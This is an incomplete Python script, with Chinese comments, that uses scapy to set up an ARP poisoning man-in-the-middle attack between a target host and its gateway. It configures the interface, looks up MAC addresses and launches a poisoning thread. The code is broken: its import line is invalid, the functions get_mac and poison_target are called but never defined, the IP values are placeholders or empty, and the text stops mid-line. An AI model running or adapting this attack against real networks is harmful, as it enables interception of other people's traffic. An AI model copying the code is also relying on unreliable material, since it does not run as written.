from scapy.all import *
import os,sys.threadimg,signal

interface='en0'

target_ip='1'
gateway_ip=''
packet_count=1000


# 设置嗅探的网卡

conf.iface=interface
# 关闭输出

print('setting up {}'.format(interface))

gateway_mac=get_mac(gateway_ip)

if gateway_mac is None:
    print("failed to get gateway mac ,exiting")
    sys.exit(0)
else:
    print("Gateway {0} is at {1}".format(gateway_ip,gateway_mac))
    
target_mac=get_mac(target_ip)

if target_mac is None:
    print("failed to get target mac ,exiting")
    sys.exit(0)
else:
    print("Target {0} is at {1}".format(target_ip, target_mac))
    

# 启动arp投毒线程
posion_threading=threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))
poison_tr